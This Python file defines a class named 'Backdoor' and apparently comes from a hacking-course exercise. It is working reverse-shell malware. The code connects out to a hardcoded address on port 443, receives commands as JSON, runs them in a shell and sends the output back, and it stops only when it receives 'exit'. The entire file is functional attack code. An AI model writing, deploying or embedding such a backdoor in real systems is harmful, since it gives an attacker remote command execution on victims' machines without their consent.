# Implementing List and exit function

import socket, json
import subprocess

class Backdoor:
    def __init__(self, ip, port):
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((ip,port))

    def send_reliable(self, command):
        json_data = json.dumps(command)
        self.connection.send(json_data.encode())

    def reliable_receive(self):
        json_received_data = ""
        while True:
            json_received_data = json_received_data + self.connection.recv(1024).decode("utf-8")
            try:
                return json.loads(json_received_data)
            except ValueError:
                continue

    def execute_system_command(self, command):
        return subprocess.check_output(command,shell = True)


    def run(self):
        while(True):
            command = self.reliable_receive()
            if(command[0] == "exit"):
                self.connection.close()
                exit()
            command_result = self.execute_system_command(command).decode("utf-8")
            self.send_reliable(command_result)
        self.connection.close()

myBackdoor = Backdoor("192.168.43.103",443)
myBackdoor.run()

